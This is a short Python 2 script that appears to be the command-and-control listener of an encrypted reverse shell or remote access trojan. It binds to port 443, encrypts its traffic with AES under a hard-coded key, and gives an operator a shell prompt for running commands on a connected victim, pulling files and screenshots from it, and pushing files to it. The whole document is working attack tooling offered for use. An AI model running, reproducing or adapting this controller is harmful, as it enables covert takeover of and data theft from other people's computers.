#!/usr/bin/python

import socket
import base64
from Crypto.Cipher import AES
from Crypto import Random
from datetime import datetime
from autopy import bitmap

BLOCK_SIZE = 32
PADDING = "{"
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c,s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c,e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
key = "31415926535897932384626433832795"
cipher = AES.new(key)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("192.168.0.112", 443))
s.listen(1)   
conn, addr = s.accept()
next_cmd = ""

while True:
    data = conn.recv(5120)
    decrypted = DecodeAES(cipher,data)

    if next_cmd.startswith("download"):
        f = open("downloaded_"+(next_cmd[9:]), "w")
        f.write(decrypted)
        f.close()
        print "File created!\n"
    elif next_cmd.startswith("screenshot"):
        f = open("Screenshot "+str(datetime.now())+".png", "w")
        f.write(decrypted)
        f.close()
        print "Screenshot taken!"
    else:
        print decrypted
    
    next_cmd = raw_input("[shell]>> ")
    
    if next_cmd.split(" ")[0] == "upload":
        f = open(next_cmd[7:])
        f_cont = str(f.read())
        f.close()
        encrypted = EncodeAES(cipher,next_cmd+"&"+str(f_cont))
    else:
        encrypted = EncodeAES(cipher,next_cmd)
    conn.send(encrypted)
    if next_cmd == "quit":
        break

